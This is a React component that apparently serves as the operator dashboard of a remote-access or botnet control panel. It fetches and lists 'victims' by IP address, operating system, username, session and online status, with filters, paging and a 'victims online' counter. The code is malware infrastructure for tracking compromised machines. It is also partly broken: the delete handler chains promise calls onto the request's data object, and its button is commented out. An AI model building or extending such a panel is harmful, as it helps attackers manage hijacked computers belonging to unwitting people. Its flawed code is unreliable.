import React, { useEffect, useState } from 'react'
import "./home.css"
import { NavLink } from 'react-router-dom'
import {io} from "socket.io-client"
import axios from "axios"
import {MdDeleteOutline} from "react-icons/md"

const HOME = () => {
 const [listVictim , setListVictims] = useState([] ?? [])
 const [Online , setOnline ] = useState("all")
 const [System , setSystem ] = useState("Windows")
 const [Ip , setIp ] = useState("")
 const [us , setUs ] = useState("")
 const [machine , setMachine ] = useState("AMD64")
 const [pages , setPage ] = useState(1)
 const [count , setCount ] = useState(1)
 const [onl , setOnl ] = useState(1)

  useEffect(() => {
    try {
      axios({
        url : process.env.REACT_APP_URL + `user/?page=${pages}&online=${Online}&system=${System}&ip_address=${Ip}&user=${us}&machine=${machine}`,
        method : "GET"
      })
      .then(res => {
        setListVictims(res.data.victims)
        setCount(res.data.count)
        setOnl(res.data.online)
      })
      .catch(err => {
        console.log(process.env.REACT_APP_URL);
        console.log(err);
        return 0
      })
    } catch (error) {
      return 0
    }
  }, [Online , System , Ip , us , machine , pages])

  const handle_delete_user = (id) => {
    axios({
      url : process.env.REACT_APP_URL + "",
      method : "DELETE",
      data : {
        id : id
      }
      .then(res => {
        console.log(res)
      })
      .catch(err => {
        console.log(err);
      })
    })
  }
  return (
    <div>
      <div className='wrapper_home'>
        <div className='select_victims'>
          <select className='select_system' value={System} onChange={(e) => {
            setSystem(e.target.value)
          }}>
            <option className='style_options'>
              Windows
            </option>
            <option className='style_options'>
              Linux
            </option>
            <option className='style_options'>
              MacOS
            </option>
          </select>
          <input className='select_ip' placeholder='ip_address ...' value={Ip} onChange={(e) => {
            setIp(e.target.value)
          }} />
          <select 
          className='select_online'
          onChange={(e) => {
            setOnline(e.target.value)
          }}>
            <option className='style_options' value={"all"}>
              all
            </option>
            <option className='style_options' value={"true"}>
              online
            </option>
          </select>
          <input  className='select_ip' placeholder='user_name' value={us} onChange={(e) => {
            setUs(e.target.value)
          }}/>
          <div style={{
            display : 'flex',
            justifyContent : 'flex-start',
            alignItems : "center",
            textAlign : "center",
            marginLeft : 20
          }}>{onl || 0} / {count || 0} <p style={
            {
              marginLeft : 10
            }
          }>victims online</p></div>
        </div>
        <div className='intro_victim'>
          <div id='enis'>STT</div>
          <div id='zwei'>IP</div>
          <div id='socket_ip'>SOCKET_IP</div>
          <div id='drei'>SYSTEM</div>
          <div id='vier'>RELEASE</div>
          <div id='funf'>VERSION</div>
          <div id='sechs'>MACHINE</div>
          <div id='sieben'>USERNAME</div>
          <div id='acht'>SESSION</div>
          <div id='online'>ONLINE</div>
          <div className='delete_user_enis'><MdDeleteOutline /></div>
        </div>
        {listVictim?.map((vct , index) => {
          return <div className='infor_victims' key={vct._id}>
            <div className='eni'>{index}</div>
            <div className='zwe'>{vct.ip_address}</div>
            <div className='socket'>{vct.ip_socket}</div>
            <div className='dre'>{vct.system}</div>
            <div className='vie'>{vct.release}</div>
            <div className='fun'>{vct.version}</div>
            <div className='sech'>{vct.machine}</div>
            <div className='siebe'>{vct.user_name}</div>
            <div className='ach'>{vct.session}</div>
            {vct.online ? <div className='onl'>online</div> :
            <div className='onl'>offline</div>
            }
            <div className='delete_user'
              // onClick={handle_delete_user(vct._id)}
            ><MdDeleteOutline /></div>
        </div>
        })}
      </div>
      <div className='page_victims'>
        <button style={{marginRight : 20}}
        onClick={() => {
          if (pages <= 1) {
            setPage(1)
          }else {
            setPage(pages - 1)
          }
        }}
        >{`<<`}</button>
        <div style={{backgroundColor : "wheat" , borderRadius : "50%"
        ,height : 30 , width : 30 , color : "black", display : "flex",
        justifyContent : "center" , alignItems : "center", textAlign : "center"
        }}><p>{pages}</p></div>
        <button style={{marginLeft : 20}}
        onClick={() => {
          if (listVictim.length < 11) {
            setPage(pages)
          }else {
            setPage(pages + 1)
          }
        }}
        >{`>>`}</button>
      </div>
    </div>
  )
}

export default HOME